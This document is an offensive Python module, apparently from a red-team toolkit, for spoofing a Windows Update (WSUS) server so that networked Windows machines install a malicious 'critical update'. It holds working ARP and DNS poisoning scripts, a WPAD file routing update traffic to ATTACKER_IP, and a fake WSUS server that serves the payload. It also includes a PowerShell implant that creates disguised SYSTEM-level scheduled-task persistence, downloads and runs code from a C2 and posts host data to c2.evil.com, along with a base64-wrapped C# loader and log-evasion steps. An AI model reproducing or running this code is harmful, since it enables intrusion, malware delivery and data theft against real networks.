#!/usr/bin/env python3
"""
WSUS Spoofing - Fake Windows Update Server
Inject Malicious Updates via Network Poisoning

ARP/DNS poisoning ile kendini Windows Update sunucusu gibi tanıt,
"Kritik Güvenlik Güncellemesi" adı altında payload dağıt!

Author: Monolith RED Team
Date: February 2025
"""

import secrets
import base64
import struct
import json
import hashlib
import gzip
from dataclasses import dataclass, field
from enum import Enum
from typing import Dict, List, Optional, Tuple, Any
from datetime import datetime
import threading
import socket


class UpdateSeverity(Enum):
    """Windows Update Severity Levels"""
    CRITICAL = "Critical"       # Will auto-install
    IMPORTANT = "Important"
    MODERATE = "Moderate"
    LOW = "Low"
    UNSPECIFIED = "Unspecified"


class UpdateClassification(Enum):
    """Windows Update Classifications"""
    SECURITY = "Security Updates"
    CRITICAL = "Critical Updates"
    DEFINITION = "Definition Updates"
    DRIVER = "Drivers"
    FEATURE_PACK = "Feature Packs"
    SERVICE_PACK = "Service Packs"
    TOOL = "Tools"
    UPDATE_ROLLUP = "Update Rollups"


class PoisonMethod(Enum):
    """Network Poisoning Methods"""
    ARP_SPOOF = "arp"           # ARP poisoning
    DNS_SPOOF = "dns"           # DNS poisoning
    DHCP_SPOOF = "dhcp"         # DHCP option injection
    LLMNR_SPOOF = "llmnr"       # LLMNR/NBT-NS poisoning
    WPAD_SPOOF = "wpad"         # WPAD injection
    MITM_PROXY = "proxy"        # Transparent proxy


@dataclass
class FakeUpdate:
    """Malicious Windows Update Package"""
    update_id: str
    kb_number: str
    title: str
    description: str
    severity: UpdateSeverity
    classification: UpdateClassification
    payload_path: str
    payload_hash: str
    size_bytes: int
    requires_reboot: bool
    silent_install: bool
    target_os: List[str]
    created_at: str = field(default_factory=lambda: datetime.now().isoformat())


@dataclass
class WSUSServer:
    """Fake WSUS Server Instance"""
    server_id: str
    listen_ip: str
    listen_port: int
    ssl_enabled: bool
    cert_path: Optional[str]
    updates: List[FakeUpdate] = field(default_factory=list)
    clients_connected: List[str] = field(default_factory=list)
    updates_deployed: int = 0
    status: str = "stopped"
    created_at: str = field(default_factory=lambda: datetime.now().isoformat())


@dataclass
class VictimClient:
    """Victim Client Information"""
    client_id: str
    ip_address: str
    hostname: str
    os_version: str
    wsus_server: Optional[str]  # Original WSUS server
    update_received: bool
    payload_executed: bool
    last_checkin: str


@dataclass
class SpoofSession:
    """WSUS Spoofing Session"""
    session_id: str
    poison_method: PoisonMethod
    target_network: str
    wsus_server: WSUSServer
    victims: List[VictimClient] = field(default_factory=list)
    status: str = "initialized"
    created_at: str = field(default_factory=lambda: datetime.now().isoformat())


class WSUSSpoofer:
    """
    WSUS Spoofing Attack Module
    
    "Trust Windows Update? Think again."
    
    Attack Flow:
    1. ARP/DNS poison to redirect WSUS traffic
    2. Serve malicious update metadata
    3. Client downloads "critical security update"
    4. Payload executes as SYSTEM
    """
    
    # WSUS URLs to intercept
    WSUS_URLS = [
        "/ClientWebService/client.asmx",
        "/SimpleAuthWebService/SimpleAuth.asmx", 
        "/ApiRemoting30/WebService.asmx",
        "/Content/*",
        "/ReportingWebService/*"
    ]
    
    # Windows Update domains
    WU_DOMAINS = [
        "windowsupdate.microsoft.com",
        "update.microsoft.com",
        "download.windowsupdate.com",
        "ntservicepack.microsoft.com",
        "wustat.windows.com",
        "*.windowsupdate.com",
        "*.update.microsoft.com"
    ]
    
    # Default fake KB numbers (look legitimate)
    FAKE_KB_NUMBERS = [
        "KB5034441",  # Security Update
        "KB5034203",  # Cumulative Update
        "KB5033375",  # .NET Update
        "KB5034122",  # Defender Definition
        "KB890830",   # MSRT (Malicious Software Removal)
    ]
    
    def __init__(self, listen_ip: str = "0.0.0.0", listen_port: int = 8530):
        self.listen_ip = listen_ip
        self.listen_port = listen_port
        self.sessions: Dict[str, SpoofSession] = {}
        self.servers: Dict[str, WSUSServer] = {}
        self._lock = threading.Lock()
        
    def create_session(self, target_network: str,
                       poison_method: PoisonMethod = PoisonMethod.ARP_SPOOF) -> SpoofSession:
        """Create WSUS spoofing session"""
        # Create fake WSUS server
        server = WSUSServer(
            server_id=secrets.token_hex(6),
            listen_ip=self.listen_ip,
            listen_port=self.listen_port,
            ssl_enabled=False,  # HTTP by default (WSUS often unencrypted!)
            cert_path=None
        )
        
        session = SpoofSession(
            session_id=secrets.token_hex(8),
            poison_method=poison_method,
            target_network=target_network,
            wsus_server=server
        )
        
        with self._lock:
            self.sessions[session.session_id] = session
            self.servers[server.server_id] = server
            
        return session
        
    def create_fake_update(self, kb_number: str,
                           title: str,
                           payload: bytes,
                           severity: UpdateSeverity = UpdateSeverity.CRITICAL,
                           classification: UpdateClassification = UpdateClassification.SECURITY) -> FakeUpdate:
        """
        Create malicious Windows Update package
        
        The payload will execute as SYSTEM when "installed"!
        """
        update = FakeUpdate(
            update_id=str(secrets.token_hex(16)),
            kb_number=kb_number,
            title=title,
            description=f"This update resolves critical security vulnerabilities in Windows. Install immediately.",
            severity=severity,
            classification=classification,
            payload_path=f"/Content/{kb_number}.exe",
            payload_hash=hashlib.sha256(payload).hexdigest(),
            size_bytes=len(payload),
            requires_reboot=False,  # Don't annoy them
            silent_install=True,
            target_os=["Windows 10", "Windows 11", "Windows Server 2019", "Windows Server 2022"]
        )
        
        return update
        
    def generate_wsus_metadata(self, update: FakeUpdate) -> str:
        """Generate WSUS update metadata XML"""
        return f'''<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <SyncUpdatesResponse xmlns="http://www.microsoft.com/SoftwareDistribution/Server/ClientWebService">
      <SyncUpdatesResult>
        <NewUpdates>
          <UpdateInfo>
            <ID>{update.update_id}</ID>
            <Deployment>
              <ID>{secrets.token_hex(8)}</ID>
              <Action>Install</Action>
              <IsAssigned>true</IsAssigned>
              <LastChangeTime>{datetime.now().isoformat()}</LastChangeTime>
              <AutoSelect>1</AutoSelect>
              <AutoDownload>1</AutoDownload>
              <SupersedenceBehavior>0</SupersedenceBehavior>
            </Deployment>
          </UpdateInfo>
        </NewUpdates>
        <OutOfScopeRevisionIDs />
      </SyncUpdatesResult>
    </SyncUpdatesResponse>
  </soap:Body>
</soap:Envelope>'''

    def generate_update_xml(self, update: FakeUpdate, payload_url: str) -> str:
        """Generate update description XML"""
        return f'''<?xml version="1.0" encoding="utf-8"?>
<Update xmlns="http://schemas.microsoft.com/msus/2002/12/Update">
  <UpdateIdentity UpdateID="{update.update_id}" RevisionNumber="1" />
  <Properties UpdateType="Software" />
  <LocalizedPropertiesCollection>
    <LocalizedProperties>
      <Language>en</Language>
      <Title>{update.title}</Title>
      <Description>{update.description}</Description>
      <UninstallNotes>This update cannot be uninstalled.</UninstallNotes>
      <MoreInfoUrl>https://support.microsoft.com/kb/{update.kb_number.replace("KB", "")}</MoreInfoUrl>
      <SupportUrl>https://support.microsoft.com</SupportUrl>
    </LocalizedProperties>
  </LocalizedPropertiesCollection>
  <Classifications>
    <Classification>{update.classification.value}</Classification>
  </Classifications>
  <MsrcSeverity>{update.severity.value}</MsrcSeverity>
  <Files>
    <File>
      <Name>{update.kb_number}.exe</Name>
      <Size>{update.size_bytes}</Size>
      <Modified>{datetime.now().isoformat()}</Modified>
      <Digest Algorithm="SHA256">{update.payload_hash}</Digest>
      <AdditionalDigest Algorithm="SHA1">{hashlib.sha1(update.payload_hash.encode()).hexdigest()}</AdditionalDigest>
    </File>
  </Files>
  <HandlerSpecificData type="CommandLineInstallation">
    <InstallCommand>/quiet /norestart</InstallCommand>
    <Arguments>/quiet /norestart</Arguments>
    <RebootByDefault>false</RebootByDefault>
    <DefaultResult>Succeeded</DefaultResult>
  </HandlerSpecificData>
</Update>'''

    def generate_cab_file(self, update: FakeUpdate, payload: bytes) -> bytes:
        """
        Generate Windows Update CAB file
        
        CAB file contains:
        - Update metadata
        - Payload executable
        """
        # In real implementation, create proper CAB structure
        # For now, return placeholder
        cab_header = b"MSCF"  # CAB magic
        # ... CAB structure ...
        return cab_header + payload
        
    def generate_arp_poison_script(self, target_network: str,
                                    gateway_ip: str,
                                    wsus_ip: str) -> str:
        """Generate ARP poisoning script"""
        return f'''
#!/usr/bin/env python3
"""ARP Poison for WSUS Spoofing"""
from scapy.all import *
import time

TARGET_NETWORK = "{target_network}"
GATEWAY_IP = "{gateway_ip}"
WSUS_IP = "{wsus_ip}"  # Original WSUS server to impersonate
MY_IP = get_if_addr(conf.iface)
MY_MAC = get_if_hwaddr(conf.iface)

def get_mac(ip):
    arp_request = ARP(pdst=ip)
    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list = srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    return answered_list[0][1].hwsrc

def poison_arp(target_ip, spoof_ip):
    """Send ARP reply to poison cache"""
    target_mac = get_mac(target_ip)
    packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    send(packet, verbose=False)

def restore_arp(target_ip, gateway_ip):
    """Restore ARP tables"""
    target_mac = get_mac(target_ip)
    gateway_mac = get_mac(gateway_ip)
    packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip, hwsrc=gateway_mac)
    send(packet, count=4, verbose=False)

print("[*] Starting ARP poison for WSUS spoofing...")
print(f"[*] Target Network: {{TARGET_NETWORK}}")
print(f"[*] Impersonating WSUS: {{WSUS_IP}}")

try:
    while True:
        # Poison all hosts to think we're the WSUS server
        for i in range(1, 255):
            target = f"{{TARGET_NETWORK.rsplit('.', 1)[0]}}.{{i}}"
            try:
                poison_arp(target, WSUS_IP)
            except:
                pass
        time.sleep(2)
except KeyboardInterrupt:
    print("[*] Restoring ARP tables...")
'''

    def generate_dns_poison_script(self, wsus_domains: List[str],
                                    redirect_ip: str) -> str:
        """Generate DNS poisoning script"""
        return f'''
#!/usr/bin/env python3
"""DNS Poison for WSUS Spoofing"""
from scapy.all import *
import re

WSUS_DOMAINS = {wsus_domains}
REDIRECT_IP = "{redirect_ip}"

def dns_spoof(pkt):
    """Intercept and spoof DNS queries for WSUS domains"""
    if pkt.haslayer(DNSQR):
        query = pkt[DNSQR].qname.decode()
        
        for domain in WSUS_DOMAINS:
            if domain.replace("*.", "") in query:
                print(f"[+] Spoofing DNS for: {{query}}")
                
                spoofed = IP(dst=pkt[IP].src, src=pkt[IP].dst) / \\
                         UDP(dport=pkt[UDP].sport, sport=53) / \\
                         DNS(id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd,
                             an=DNSRR(rrname=query, ttl=300, rdata=REDIRECT_IP))
                             
                send(spoofed, verbose=False)
                return

print("[*] Starting DNS spoofing for WSUS domains...")
print(f"[*] Redirecting to: {{REDIRECT_IP}}")

sniff(filter="udp port 53", prn=dns_spoof)
'''

    def generate_responder_config(self) -> Dict:
        """Generate Responder configuration for WSUS spoofing"""
        return {
            "description": "Use Responder for LLMNR/NBT-NS/WPAD poisoning",
            "command": "responder -I eth0 -wFb",
            "config_changes": {
                "Responder.conf": {
                    "HTTP": "On",
                    "HTTPS": "On",
                    "WPAD": "On",
                    "ProxyAuth": "Off",  # Don't require auth
                    "HTTPDir": "/path/to/wsus/content"
                }
            },
            "wpad_dat": '''
function FindProxyForURL(url, host) {
    // Redirect Windows Update traffic
    if (shExpMatch(host, "*windowsupdate*") ||
        shExpMatch(host, "*update.microsoft*") ||
        shExpMatch(host, "*wsus*")) {
        return "PROXY ATTACKER_IP:8530";
    }
    return "DIRECT";
}
'''
        }

    def generate_fake_wsus_server(self, payload: bytes) -> str:
        """Generate fake WSUS HTTP server code"""
        return '''
#!/usr/bin/env python3
"""Fake WSUS Server"""
from http.server import HTTPServer, BaseHTTPRequestHandler
import ssl
import os

PAYLOAD_PATH = "/tmp/payload.exe"
KB_NUMBER = "KB5034441"

class WSUSHandler(BaseHTTPRequestHandler):
    
    def log_message(self, format, *args):
        print(f"[WSUS] {self.client_address[0]} - {args[0]}")
    
    def do_POST(self):
        """Handle WSUS SOAP requests"""
        content_length = int(self.headers.get('Content-Length', 0))
        body = self.rfile.read(content_length)
        
        # Check for sync request
        if b"SyncUpdates" in body or b"GetExtendedUpdateInfo" in body:
            print(f"[+] Client {self.client_address[0]} checking for updates...")
            self.send_update_available()
        else:
            self.send_response(200)
            self.end_headers()
            
    def do_GET(self):
        """Handle content downloads"""
        if self.path.endswith(".exe") or self.path.endswith(".cab"):
            print(f"[!] Client {self.client_address[0]} downloading payload!")
            self.send_payload()
        elif self.path.endswith(".xml") or self.path.endswith(".cab"):
            self.send_metadata()
        else:
            self.send_response(404)
            self.end_headers()
            
    def send_update_available(self):
        """Send SOAP response with available update"""
        response = f"""<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <SyncUpdatesResponse xmlns="http://www.microsoft.com/SoftwareDistribution/Server/ClientWebService">
      <SyncUpdatesResult>
        <NewUpdates>
          <UpdateInfo>
            <ID>{os.urandom(16).hex()}</ID>
            <Deployment>
              <Action>Install</Action>
              <IsAssigned>true</IsAssigned>
              <AutoSelect>1</AutoSelect>
              <AutoDownload>1</AutoDownload>
            </Deployment>
          </UpdateInfo>
        </NewUpdates>
      </SyncUpdatesResult>
    </SyncUpdatesResponse>
  </soap:Body>
</soap:Envelope>"""
        
        self.send_response(200)
        self.send_header("Content-Type", "text/xml; charset=utf-8")
        self.send_header("Content-Length", len(response))
        self.end_headers()
        self.wfile.write(response.encode())
        
    def send_payload(self):
        """Send malicious payload"""
        with open(PAYLOAD_PATH, "rb") as f:
            payload = f.read()
            
        self.send_response(200)
        self.send_header("Content-Type", "application/octet-stream")
        self.send_header("Content-Length", len(payload))
        self.send_header("Content-Disposition", f"attachment; filename={KB_NUMBER}.exe")
        self.end_headers()
        self.wfile.write(payload)
        print(f"[!] Payload sent to {self.client_address[0]}!")
        
    def send_metadata(self):
        """Send update metadata"""
        self.send_response(200)
        self.send_header("Content-Type", "text/xml")
        self.end_headers()
        self.wfile.write(b"<xml>metadata</xml>")

def main():
    server = HTTPServer(("0.0.0.0", 8530), WSUSHandler)
    print("[*] Fake WSUS Server started on port 8530")
    print("[*] Waiting for Windows Update clients...")
    
    # Optional: Enable SSL for HTTPS
    # context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
    # context.load_cert_chain('cert.pem', 'key.pem')
    # server.socket = context.wrap_socket(server.socket, server_side=True)
    
    server.serve_forever()

if __name__ == "__main__":
    main()
'''

    def generate_pyws_payload(self, c2_url: str) -> bytes:
        """Generate PowerShell payload disguised as Windows Update"""
        ps_script = f'''
# "Windows Update" Payload
$ErrorActionPreference = "SilentlyContinue"

# Fake update progress
$title = "Installing Windows Update KB5034441..."
Write-Host $title

# Create scheduled task for persistence
$action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -ep bypass -c `"IEX(IWR '{c2_url}/beacon')`""
$trigger = New-ScheduledTaskTrigger -AtLogon
$principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -RunLevel Highest
Register-ScheduledTask -TaskName "Microsoft\\Windows\\UpdateOrchestrator\\Reboot" -Action $action -Trigger $trigger -Principal $principal -Force

# Beacon to C2
$info = @{{
    hostname = $env:COMPUTERNAME
    username = $env:USERNAME
    domain = $env:USERDOMAIN
    os = (Get-WmiObject Win32_OperatingSystem).Caption
    ip = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object {{$_.InterfaceAlias -notmatch "Loopback"}}).IPAddress
    wsus_update = "KB5034441"
    timestamp = Get-Date -Format "yyyy-MM-ddTHH:mm:ss"
}} | ConvertTo-Json

try {{
    Invoke-RestMethod -Uri "{c2_url}/checkin" -Method POST -Body $info -ContentType "application/json"
}} catch {{}}

# Write success to event log (blend in)
Write-EventLog -LogName Application -Source "Windows Update" -EventID 19 -EntryType Information -Message "Installation Successful: KB5034441"

exit 0
'''
        return ps_script.encode('utf-16-le')
        
    def generate_exe_payload_wrapper(self, ps_payload: bytes) -> str:
        """Generate C# wrapper to execute PowerShell payload"""
        return '''
using System;
using System.Diagnostics;
using System.Management.Automation;
using System.Management.Automation.Runspaces;
using System.Text;

namespace WindowsUpdate
{
    class Program
    {
        static void Main(string[] args)
        {
            // Base64 encoded PowerShell
            string encoded = "''' + base64.b64encode(ps_payload).decode() + '''";
            byte[] decoded = Convert.FromBase64String(encoded);
            string script = Encoding.Unicode.GetString(decoded);
            
            // Create runspace
            using (Runspace runspace = RunspaceFactory.CreateRunspace())
            {
                runspace.Open();
                using (Pipeline pipeline = runspace.CreatePipeline())
                {
                    pipeline.Commands.AddScript(script);
                    pipeline.Invoke();
                }
            }
        }
    }
}
'''

    def generate_wsuspect_config(self) -> Dict:
        """Generate WSUSpect proxy configuration"""
        return {
            "tool": "WSUSpect",
            "description": "WSUS attack proxy - intercept and modify updates",
            "github": "https://github.com/ctxis/wsuspect-proxy",
            "usage": "python wsuspect_proxy.py --payload payload.exe",
            "alternative_tools": [
                {
                    "name": "PyWSUS",
                    "description": "Standalone fake WSUS server",
                    "github": "https://github.com/GoSecure/pywsus"
                },
                {
                    "name": "SharpWSUS",
                    "description": "C# WSUS attack tool",
                    "github": "https://github.com/nettitude/SharpWSUS"
                }
            ]
        }
        
    def detect_wsus_config(self) -> str:
        """Generate script to detect WSUS configuration on targets"""
        return '''
# Detect WSUS Configuration
function Get-WSUSConfig {
    param([string]$ComputerName = "localhost")
    
    $regPath = "HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\WindowsUpdate"
    
    try {
        $config = Get-ItemProperty $regPath -ErrorAction Stop
        
        return @{
            WUServer = $config.WUServer
            WUStatusServer = $config.WUStatusServer
            UseWUServer = $config.UseWUServer
            ElevateNonAdmins = $config.ElevateNonAdmins
            TargetGroup = $config.TargetGroup
            HTTPProxy = (Get-ItemProperty "HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Internet Settings" -Name ProxyServer -ErrorAction SilentlyContinue).ProxyServer
        }
    } catch {
        return @{
            WUServer = "Not configured (using Windows Update directly)"
            UseWUServer = 0
        }
    }
}

# Check if WSUS is HTTP (vulnerable!)
$config = Get-WSUSConfig
if ($config.WUServer -and $config.WUServer -notmatch "^https://") {
    Write-Host "[!] VULNERABLE: WSUS is using HTTP!" -ForegroundColor Red
    Write-Host "    Server: $($config.WUServer)"
}
'''

    def generate_implant(self, implant_type: str = "powershell",
                         c2_url: str = "http://c2.evil.com") -> str:
        """Generate WSUS-aware implant"""
        
        if implant_type == "powershell":
            return f'''
# WSUS Spoofing Implant
$ErrorActionPreference = "SilentlyContinue"

# === Phase 1: Reconnaissance ===
function Get-WSUSInfo {{
    $regPath = "HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\WindowsUpdate"
    $config = Get-ItemProperty $regPath -ErrorAction SilentlyContinue
    
    return @{{
        wsus_server = $config.WUServer
        is_http = $config.WUServer -notmatch "^https://"
        auto_update = (Get-ItemProperty "HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\WindowsUpdate\\Auto Update").AUOptions
    }}
}}

# === Phase 2: Check for HTTP WSUS (Vulnerable!) ===
$wsusInfo = Get-WSUSInfo
if ($wsusInfo.is_http) {{
    # Report vulnerable WSUS
    $report = @{{
        hostname = $env:COMPUTERNAME
        wsus_server = $wsusInfo.wsus_server
        vulnerable = $true
        timestamp = Get-Date -Format "o"
    }} | ConvertTo-Json
    
    Invoke-RestMethod -Uri "{c2_url}/wsus/vulnerable" -Method POST -Body $report
}}

# === Phase 3: Trigger Windows Update ===
function Trigger-WindowsUpdate {{
    # Force check for updates (will hit our fake server if ARP poisoned)
    $updateSession = New-Object -ComObject Microsoft.Update.Session
    $updateSearcher = $updateSession.CreateUpdateSearcher()
    
    # Search triggers connection to WSUS
    $searchResult = $updateSearcher.Search("IsInstalled=0")
    
    return $searchResult.Updates.Count
}}

# === Main ===
$updates = Trigger-WindowsUpdate
Write-Host "[*] Found $updates updates (from potentially spoofed WSUS)"
'''
        else:  # Python
            return f'''
#!/usr/bin/env python3
"""WSUS Spoof Detection and Exploitation"""
import winreg
import subprocess
import requests

class WSUSChecker:
    def __init__(self, c2_url="{c2_url}"):
        self.c2_url = c2_url
        
    def get_wsus_config(self):
        """Get WSUS configuration from registry"""
        try:
            key = winreg.OpenKey(
                winreg.HKEY_LOCAL_MACHINE,
                r"SOFTWARE\\Policies\\Microsoft\\Windows\\WindowsUpdate"
            )
            wsus_server = winreg.QueryValueEx(key, "WUServer")[0]
            use_wsus = winreg.QueryValueEx(key, "UseWUServer")[0]
            
            return {{
                "wsus_server": wsus_server,
                "use_wsus": use_wsus,
                "is_http": not wsus_server.startswith("https://"),
                "vulnerable": not wsus_server.startswith("https://")
            }}
        except:
            return {{"wsus_server": None, "use_wsus": False}}
            
    def trigger_update_check(self):
        """Force Windows Update check"""
        subprocess.run(
            ["powershell", "-c", "(New-Object -ComObject Microsoft.Update.Session).CreateUpdateSearcher().Search('IsInstalled=0')"],
            capture_output=True
        )
        
    def report(self):
        """Report WSUS config to C2"""
        config = self.get_wsus_config()
        if config["vulnerable"]:
            requests.post(f"{{self.c2_url}}/wsus/vulnerable", json=config)

if __name__ == "__main__":
    checker = WSUSChecker()
    config = checker.get_wsus_config()
    
    if config.get("vulnerable"):
        print(f"[!] WSUS is HTTP: {{config['wsus_server']}}")
        print("[!] Vulnerable to WSUS spoofing!")
'''

    def get_attack_flow(self) -> Dict:
        """Get complete WSUS spoofing attack flow"""
        return {
            "name": "WSUS Spoofing Attack",
            "description": "Inject malicious updates via fake WSUS server",
            "phases": [
                {
                    "phase": 1,
                    "name": "Reconnaissance",
                    "actions": [
                        "Identify WSUS server in network",
                        "Check if WSUS uses HTTP (vulnerable)",
                        "Enumerate clients configured for WSUS",
                        "Map network for poisoning"
                    ]
                },
                {
                    "phase": 2,
                    "name": "Positioning",
                    "actions": [
                        "ARP spoof to intercept WSUS traffic",
                        "OR DNS spoof WSUS hostname",
                        "OR WPAD injection for proxy",
                        "Start fake WSUS server"
                    ]
                },
                {
                    "phase": 3,
                    "name": "Payload Preparation",
                    "actions": [
                        "Create malicious update package",
                        "Generate legitimate-looking metadata",
                        "Sign with self-signed cert if needed",
                        "Host payload on fake WSUS"
                    ]
                },
                {
                    "phase": 4,
                    "name": "Delivery",
                    "actions": [
                        "Wait for client update check",
                        "OR trigger update check remotely",
                        "Serve malicious update metadata",
                        "Client downloads 'critical update'"
                    ]
                },
                {
                    "phase": 5,
                    "name": "Execution",
                    "actions": [
                        "Update installs as SYSTEM",
                        "Payload executes with highest privileges",
                        "Persistence established",
                        "Beacon to C2"
                    ]
                }
            ],
            "requirements": [
                "WSUS using HTTP (not HTTPS)",
                "Network position for poisoning",
                "Ability to serve content on port 8530"
            ],
            "detection_evasion": [
                "Use legitimate-looking KB numbers",
                "Match update metadata format exactly",
                "Execute payload silently",
                "Clean Windows Update logs"
            ]
        }
        
    def get_session_stats(self, session_id: str) -> Dict:
        """Get session statistics"""
        session = self.sessions.get(session_id)
        if not session:
            return {"error": "Session not found"}
            
        return {
            "session_id": session.session_id,
            "poison_method": session.poison_method.value,
            "target_network": session.target_network,
            "victims_count": len(session.victims),
            "updates_deployed": session.wsus_server.updates_deployed,
            "status": session.status,
            "created_at": session.created_at
        }


# Singleton instance
_spoofer = None

def get_spoofer() -> WSUSSpoofer:
    """Get or create WSUS Spoofer instance"""
    global _spoofer
    if _spoofer is None:
        _spoofer = WSUSSpoofer()
    return _spoofer


# Demo/Testing
if __name__ == "__main__":
    spoofer = WSUSSpoofer()
    
    # Create session
    session = spoofer.create_session("10.0.0.0/24", PoisonMethod.ARP_SPOOF)
    print(f"[+] Session created: {session.session_id}")
    
    # Create fake update
    payload = b"malicious_payload_here"
    update = spoofer.create_fake_update(
        kb_number="KB5034441",
        title="2025-02 Cumulative Update for Windows 10",
        payload=payload,
        severity=UpdateSeverity.CRITICAL
    )
    print(f"[+] Fake update created: {update.kb_number}")
    
    # Get attack flow
    flow = spoofer.get_attack_flow()
    print(f"\n[*] Attack: {flow['name']}")
    for phase in flow["phases"]:
        print(f"    Phase {phase['phase']}: {phase['name']}")
